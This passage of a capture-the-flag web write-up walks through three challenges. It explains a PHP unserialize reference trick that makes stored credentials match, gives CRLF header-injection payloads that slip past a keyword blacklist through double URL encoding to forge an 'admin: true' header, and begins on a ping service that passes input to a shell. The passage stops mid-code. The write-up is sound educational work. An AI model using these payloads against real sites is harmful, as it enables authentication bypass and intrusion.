<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$vault_open</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$bankPin</span> = <span class="keyword">new</span> <span class="title class_">Sequence</span>();</span><br><span class="line">    <span class="variable">$bankPin</span>-&gt;<span class="title function_ invoke__">generateVaultRandom</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;sequence&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$base64DecodedSequence</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$user</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;DANGER ABORTING&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Here, after decoding it from base64, it will check whether your input is in a form of <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/PHP_serialization_format">php serialization format</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!(<span class="variable">$validSequence</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$base64DecodedSequence</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;NOT A VALID SEQUENCE&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$validSequence</span> <span class="keyword">instanceof</span> Sequence)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NOT A VALID SEQUENCE&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>To make a valid php serialization format that is an instance of sequence, we need to follow the <code>sequence class</code> that is created inside <code>sequence.php</code> as follows.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> </span>&#123; <span class="comment">// name of class &quot;Sequence&quot; with 8 characters</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vaultCreds</span>; <span class="comment">// 1st property with 10 characters</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$guardCreds</span>; <span class="comment">// 2nd property with 10 characters</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateVaultRandom</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="number">10</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">            <span class="variable">$randomNumber</span> = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">999999999</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;vaultCreds[] = <span class="variable">$randomNumber</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>Object Part</em></p>
<p><code>O:8:&quot;Sequence&quot;:2</code></p>
<ul>
<li>O &#x3D; Object</li>
<li>8 &#x3D; Length of class name</li>
<li>“Sequence” &#x3D; Class name</li>
<li>2 &#x3D; Number of properties</li>
</ul>
<p><em>Sequence Part</em></p>
<p><code>&#123;s:10:&quot;vaultCreds&quot;;a:0:&#123;&#125;s:10:&quot;guardCreds&quot;;a:0:&#123;&#125;&#125;</code></p>
<p>First property:</p>
<ul>
<li>s:10:”vaultCreds” &#x3D; Property name</li>
<li>a:0:{} &#x3D; Empty array with the size of 10</li>
</ul>
<p>Second property:</p>
<ul>
<li>s:10:”guardCreds” &#x3D; Property name</li>
<li>a:0:{} &#x3D; Empty array with the size of 10</li>
</ul>
<p>Combining both parts together now we have a valid sequence!<br><code>O:8:&quot;Sequence&quot;:2&#123;s:10:&quot;vaultCreds&quot;;a:0:&#123;&#125;s:10:&quot;guardCreds&quot;;a:0:&#123;&#125;&#125;</code></p>
<p>Then the value of vaultCreds from <code>bankPin</code> object will randomly generated and assigned to the property vaultCreds of <code>validSequence</code> object.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="number">10</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">       <span class="variable">$validSequence</span>-&gt;vaultCreds = <span class="variable">$bankPin</span>-&gt;vaultCreds; <span class="comment">//set as bank creds</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Lastly, it will compare the values of vaultCreds to guardCreds.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">0</span>; <span class="variable">$z</span> &lt; <span class="number">10</span>; <span class="variable">$z</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$validSequence</span>-&gt;vaultCreds[<span class="variable">$z</span>] !== <span class="variable">$validSequence</span>-&gt;guardCreds[<span class="variable">$z</span>]) &#123;</span><br><span class="line">            <span class="variable">$vault_open</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The exploit here is actually to point the property of guardCreds to vaultCreds, therefore regardless what will happen to the value of vaultCreds, eventually it will always be the same as guardCreds, since guardCreds is pointing to vaultCreds :))</p>
<p><code>O:8:&quot;Sequence&quot;:2:&#123;s:10:&quot;vaultCreds&quot;;a:0:&#123;&#125;s:10:&quot;guardCreds&quot;;R:2;&#125;</code></p>
<blockquote>
<p>Don’t forget to encode it in base64!</p>
</blockquote>
<h2 id="Protecc"><a href="#Protecc" class="headerlink" title="Protecc"></a>Protecc</h2><h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><p>This website is running on flask, and at first glance, I thought it is related to XSS since the input looks like it is reflected to the page like so</p>
<p><img src="/./Website/image2.png"></p>
<p>But upon further research, I guess I was wrong because of Jinja2’s autoescaping input which means that any special characters like <code>&lt;, &gt;, &amp;, &quot;, etc.</code> will be converted to HTML entities, plus there is no bots in the source code provided.</p>
<p><img src="/./Website/image3.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, protectionName=setName)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;bg-gray-100 text-black dark:bg-gray-900 dark:text-white&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container mx-auto p-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mb-4 text-2xl font-bold&quot;</span>&gt;</span>Name yo own protection<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">class</span>=<span class="string">&quot;space-y-4&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;rounded-lg bg-blue-500 px-4 py-2 text-center text-base font-semibold text-white shadow-md transition duration-200 ease-in hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-blue-200&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        Set Protection</span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      &#123;% if protectionName %&#125;</span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-4 w-full text-lg font-semibold&quot;</span>&gt;</span></span><br><span class="line">        Protection set to: &#123;&#123; protectionName &#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mx-auto mt-8&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So let’s try to analyze the the <code>app.py</code> and see what we can find.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verifier&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verifier</span>():</span><br><span class="line">    <span class="comment"># To verify if everything is working as intended</span></span><br><span class="line">    <span class="built_in">input</span> = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">input</span> != <span class="string">&quot;&quot;</span>:</span><br><span class="line"></span><br><span class="line">        response = requests.get(<span class="string">f&quot;http://localhost:<span class="subst">&#123;port&#125;</span>/?setName=&quot;</span> + <span class="built_in">input</span>)</span><br><span class="line">        xssProtection = response.headers.get(<span class="string">&#x27;X-XSS-Protection&#x27;</span>)</span><br><span class="line">        RCEProtection = response.headers.get(<span class="string">&#x27;Protection-RCE&#x27;</span>)</span><br><span class="line">        SecretProtection = response.headers.get(<span class="string">&#x27;Protection-Secret&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># While we are it, let&#x27;s add an admin check too for easy access.</span></span><br><span class="line">        adminCheck = response.headers.get(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(response.headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(header <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> header != <span class="string">&quot;&quot;</span> <span class="keyword">for</span> header <span class="keyword">in</span> [xssProtection, RCEProtection, SecretProtection]) <span class="keyword">and</span> adminCheck == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;verifier.html&#x27;</span>, result=<span class="string">&quot;Wow you&#x27;re an expert in protection! Here&#x27;s your flag: &quot;</span> + flag)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;verifier.html&#x27;</span>, result=<span class="string">&quot;It&#x27;s secure... I guess...?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;verifier.html&#x27;</span>, result=<span class="string">&quot;Please give me a recipe for the best protection&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>So at <code>/verifier</code> endpoint, if we want the website to render the flag, we need to send in an <code>input</code> which is the value of <code>setName</code> parameter, that will eventually make the <code>server</code> to give response with these headers:-</p>
<ol>
<li>X-XSS-Protection: 1</li>
<li>Protection-RCE: 1</li>
<li>Protection-Secret: 1</li>
<li>admin: true</li>
</ol>
<p>Any order is fine, and the value can be anything, EXCEPT for admin, the value must be <code>true</code>.</p>
<p>The question here is, is it possible for us to modify the response header to meet the conditions?</p>
<p>Well, thanks to <code>/</code> endpoint there is a <code>default</code> function that allows us to inject our input to the response headers!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">default</span>():</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Content-Type-Options&#x27;</span>: <span class="string">&#x27;nosniff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Strict-Transport-Security&#x27;</span>: <span class="string">&#x27;max-age=31536000; includeSubDomains&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referrer-Policy&#x27;</span>: <span class="string">&#x27;no-referrer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Feature-Policy&#x27;</span>: <span class="string">&quot;geolocation &#x27;self&#x27;; microphone &#x27;none&#x27;; camera &#x27;none&#x27;&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protectionHeader: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span> | <span class="built_in">bytes</span>] = <span class="built_in">dict</span>(headers)</span><br><span class="line"></span><br><span class="line">    setName = request.args.get(<span class="string">&#x27;setName&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">filter</span>(setName) == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacking attempt...s?&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        setName = <span class="built_in">filter</span>(setName)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> setName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> setName != <span class="string">&quot;&quot;</span>:</span><br><span class="line"></span><br><span class="line">        defaultProtectionValue = <span class="string">&quot;1&quot;</span></span><br><span class="line">        protectionHeader[<span class="string">&#x27;X-XSS-Protection&#x27;</span>] = defaultProtectionValue</span><br><span class="line">        protectionHeader[<span class="string">&#x27;Protection-&#x27;</span> + setName] = defaultProtectionValue</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, protectionName=setName), protectionHeader</span><br></pre></td></tr></table></figure>

<p>Let’s try to understand it bit by bit. By default, if we send just an <code>empty string</code>. These response headers will be included in the output for sure.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">       <span class="string">&#x27;X-Content-Type-Options&#x27;</span>: <span class="string">&#x27;nosniff&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;Strict-Transport-Security&#x27;</span>: <span class="string">&#x27;max-age=31536000; includeSubDomains&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;Referrer-Policy&#x27;</span>: <span class="string">&#x27;no-referrer&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;Feature-Policy&#x27;</span>: <span class="string">&quot;geolocation &#x27;self&#x27;; microphone &#x27;none&#x27;; camera &#x27;none&#x27;&quot;</span>,</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">Date: Mon, 27 Jan 2025 16:53:27 GMT</span><br><span class="line">X-Content-Type-Options: nosniff &lt;------------ focus from here</span><br><span class="line">Strict-Transport-Security: max-age=31536000; includeSubDomains</span><br><span class="line">Referrer-Policy: no-referrer</span><br><span class="line"><span class="string">&#x27;Feature-Policy&#x27;</span>: <span class="string">&quot;geolocation &#x27;self&#x27;; microphone &#x27;none&#x27;; camera &#x27;none&#x27;&quot;</span></span><br><span class="line">*anything <span class="keyword">else</span> that is included by default*</span><br></pre></td></tr></table></figure>

<p>Now if we input any values for <code>setName</code>, for example the value <code>test</code>, there are 2 more headers pops up in the response headers!</p>
<p>However, only 1 of them meet the conditions, the second response header that is included is not even inside the list of condition :T</p>
<ol>
<li>X-XSS-Protection: 1 ✅</li>
<li>Protection-test: 1 ❌</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">Date: Mon, 27 Jan 2025 16:58:35 GMT</span><br><span class="line">X-Content-Type-Options: nosniff &lt;------------ focus from here</span><br><span class="line">Strict-Transport-Security: max-age=31536000; includeSubDomains</span><br><span class="line">Referrer-Policy: no-referrer</span><br><span class="line">Feature-Policy: geolocation <span class="string">&#x27;self&#x27;</span>; microphone <span class="string">&#x27;none&#x27;</span>; camera <span class="string">&#x27;none&#x27;</span></span><br><span class="line">X-XSS-Protection: 1 &lt;------------ new headers that is included</span><br><span class="line">Protection-<span class="built_in">test</span>: 1</span><br><span class="line">*anything <span class="keyword">else</span> that is included by default*</span><br></pre></td></tr></table></figure>

<p>So to meet the conditions we were left with 3 more response headers. How do we modify the input so that we can include all of them in the response header?</p>
<ol>
<li>X-XSS-Protection: 1 ✅</li>
<li>Protection-RCE: 1</li>
<li>Protection-Secret: 1</li>
<li>admin: true</li>
</ol>
<p>Let’s try <code>Protection-RCE: 1</code> first since it is the easiest, just input <code>RCE</code> we don’t need to include the values <code>: 1</code>, since it is added by default to the last response header that is created.</p>
<ol>
<li>X-XSS-Protection: 1 ✅</li>
<li>Protection-RCE: 1 ✅</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?setName=RCE HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">Date: Mon, 27 Jan 2025 17:34:14 GMT</span><br><span class="line">...</span><br><span class="line">X-XSS-Protection: 1 ✅</span><br><span class="line">Protection-RCE: 1 ✅</span><br></pre></td></tr></table></figure>

<p>Now to include one more response header lets say <code>Protection-Secret: 1</code>, you need to find out how to create a new line in response header. In python&#x2F;flask it is possible to do that by using <code>%0d%0a</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?setName=RCE%0d%0aProtection-Secret HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">...</span><br><span class="line">X-XSS-Protection: 1 ✅</span><br><span class="line">Protection-RCE ❌</span><br><span class="line">Protection-Secret: 1 ✅</span><br></pre></td></tr></table></figure>

<p>But we can’t set its value to <code>: 1</code> because… the char <code>:</code> is blacklisted :T</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    blockedPattern = [<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;true&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blockedPattern:</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> pattern.lower() <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">or</span> pattern.upper() <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> unquote(<span class="built_in">input</span>)</span><br></pre></td></tr></table></figure>

<p>To bypass the function just <code>URL Encode</code> the blacklisted characters <code>2 times</code>. For non-special characters like <code>admin</code> can be url encoded by using this <a target="_blank" rel="noopener" href="https://onlinetexttools.com/url-encode-text">website</a> or just create a script on python.</p>
<ol>
<li>‘:’ will become <code>%253A</code></li>
<li>‘admin’ will become <code>%2561%2564%256D%2569%256E</code></li>
<li>‘true’ will become <code>%2574%2572%2575%2565</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?setName=RCE%253A%201%0d%0aProtection-Secret HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">...</span><br><span class="line">X-XSS-Protection: 1 ✅</span><br><span class="line">Protection-RCE: 1 ✅</span><br><span class="line">Protection-Secret: 1 ✅</span><br></pre></td></tr></table></figure>

<p>And now we are left with the last header which is <code>admin: true</code>. As stated before just double url encode it :))</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?setName=RCE%253A%201%0d%0a%2561%2564%256D%2569%256E%253A%20%2574%2572%2575%2565%0d%0aProtection-Secret HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.0.6 Python/3.8.20</span><br><span class="line">...</span><br><span class="line">X-XSS-Protection: 1 ✅</span><br><span class="line">Protection-RCE: 1 ✅</span><br><span class="line">admin: <span class="literal">true</span> ✅</span><br><span class="line">Protection-Secret: 1 ✅</span><br></pre></td></tr></table></figure>

<p>Just for your information the payload that we are using right now will only work if we directly put it inside the input form and not at the URL, both input form and URL process the payload differently, for example browsers usually auto-encoding special characters again at the URL. :T</p>
<h2 id="Ping-as-a-Service"><a href="#Ping-as-a-Service" class="headerlink" title="Ping as a Service"></a>Ping as a Service</h2><h3 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h3><p>This website is really simple, nothing crazy going on…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;OPTIONS&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    user_supplied_IP = request.args.get(<span class="string">&#x27;IP&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myIPaddress = ipaddress.ip_address(user_supplied_IP)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        custom_error_msg = <span class="string">&#x27;You supplied an invalid IP address&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=custom_error_msg)</span><br><span class="line"></span><br><span class="line">    command_to_execute = <span class="string">f&#x27;ping -c 2 <span class="subst">&#123;myIPaddress&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(command_to_execute, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        results = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, command_to_execute], timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=results.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        custom_error_msg = <span class="string">&#x27;Request Timed Out!&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=custom_error_msg)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        custom_error_msg = <span class="string">&#x27;An error occured&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=custom_error_msg)</span><br><span class="line"></span><br><span class="line"><span 